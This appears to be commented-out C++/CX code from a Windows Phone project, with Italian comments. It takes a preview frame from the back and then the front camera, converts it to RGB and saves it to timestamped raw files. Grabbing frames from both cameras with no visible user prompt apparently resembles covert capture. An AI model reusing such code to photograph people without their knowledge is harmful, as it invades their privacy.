			////task<AudioVideoCaptureDevice^> AudioTask(AudioVideoCaptureDevice::OpenForAudioOnlyAsync(), AudioTaskTokenSource.get_token());
			task<PhotoCaptureDevice^> AudioTaskBack(PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Back, captureDimensions), PhotoTaskTokenSourceBack.get_token());


			AudioTaskBack.then([=](task<PhotoCaptureDevice^> getPhotoTask)
			{
					auto pPhotoCaptureDevice = getPhotoTask.get();

					Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;

						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[32];
						sprintf(nomeFile,"photoB_%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();
				
			}
		
	).wait();
	****/

/****
			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;

			task<PhotoCaptureDevice^> AudioTaskFront(PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Front, captureDimensions), PhotoTaskTokenSourceFront.get_token());


			AudioTaskFront.then([=](task<PhotoCaptureDevice^> getPhotoTask)
			{
					auto pPhotoCaptureDevice = getPhotoTask.get();

					Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;

						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[32];
						sprintf(nomeFile,"photoF_%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();
				
			}
		
	).wait();

****/







}
